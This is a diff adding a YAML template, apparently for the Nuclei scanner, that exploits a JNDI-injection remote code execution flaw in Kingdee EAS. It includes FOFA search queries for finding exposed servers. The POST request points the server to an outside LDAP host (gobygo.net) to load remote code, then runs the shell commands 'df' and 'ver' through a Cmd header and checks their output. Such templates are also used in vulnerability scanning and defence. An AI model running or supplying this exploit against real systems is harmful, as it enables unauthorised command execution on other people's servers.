@@ -1,0 +1,47 @@
+id: kingdee-eas-createDataSource-jndi-rce
+
+info:
+  name: 金蝶EAS前台JNDI加载RCE
+  author: hugh
+  severity: critical
+  reference:
+    - 
+  tags: kingdee,eas,oa,fileupload
+  metadata: 
+    fofa-query: title="EAS系统登录"
+    fofa-query1: app="Kingdee-EAS"
+    veified: true
+
+variables:
+  random_str: "{{rand_base(16)}}"
+
+http:
+  - raw:
+      - |
+        POST /appmonitor//protect/datasource/createDataSource HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 243
+        Accept: */*
+        Cmd: {{vulpath}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: https://{{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        name={{random_str}}&jndiName=ldap://gobygo.net/A7&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=asdasxasx&userName=asdasxasx&password=asdasxasx&repassword=asdasxasx&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=
+           
+    attack: clusterbomb
+    payloads:
+      vulpath:
+        - "df"
+        - "ver"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Filesystem"
+          - "Microsoft Windows"
+          - "df"
+        condition: or
